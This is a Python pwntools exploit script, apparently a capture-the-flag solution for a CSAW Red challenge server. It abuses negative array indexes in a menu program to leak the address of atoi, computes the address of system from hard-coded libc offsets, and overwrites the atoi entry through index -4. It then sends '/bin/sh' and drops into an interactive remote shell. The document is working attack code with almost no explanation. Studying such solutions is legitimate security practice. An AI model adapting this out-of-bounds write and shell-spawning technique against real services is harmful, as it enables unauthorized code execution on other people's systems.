from pwn import *
from Crypto.Util.number import long_to_bytes

def maybe_hex(x):
    if x is None:
        return '??'
    else:
        return f'{x:02x}'

def list_try_map(f, l):
    result = []
    for x in l:
        try:
            result.append(f(x))
        except Exception:
            pass
    return result

HOST = 'pwn.red.csaw.io'
PORT = 5010

s = remote(HOST, PORT)    
s.recv()

def get_chunk(num):
    s.sendline('2')
    s.recv()
    s.sendline(str(num))
    data = s.recv()

    subdata = data.split(b'-----------------------------')[2]
    i = subdata.rfind(b'\nStrength:')
    namedata = [x for x in subdata[len(b'\nName:         '):i]]
    namedata += [None] * (16 - len(namedata))
    subsubdata = subdata[i:]
    otherdata = [x % 256 for x in list_try_map(int, subsubdata.split())]
    otherdata2 = otherdata[0:6] + list(divmod(otherdata[6], 256)) # might need reversed(list(...))
    combineddata = namedata + otherdata2
    
    return combineddata



s = remote(HOST, PORT)
s.recv()
atoi_addr = '0000' + ''.join(maybe_hex(x) for x in get_chunk(-4)[5::-1])
addr1 = '0000' + ''.join(maybe_hex(x) for x in get_chunk(-5)[5::-1])
addr2 = '0000' + ''.join(maybe_hex(x) for x in get_chunk(-6)[5::-1])
addr3 = '0000' + ''.join(maybe_hex(x) for x in get_chunk(-7)[5::-1])
addr4 = '0000' + ''.join(maybe_hex(x) for x in get_chunk(-8)[5::-1])


print(addr1)
print(addr2)
print(addr3)
print(addr4)
i = int(atoi_addr, 16) - 0x00140730 + 0x0014f4e0

sysaddr = long_to_bytes(i)
print("System address", end=": ")
print(sysaddr)
s.sendline("3")
print(s.recv())
s.sendline("-4")
print(s.recv())
s.sendline(sysaddr) 
print(s.recv())
s.sendline("/bin/sh")
s.interactive()
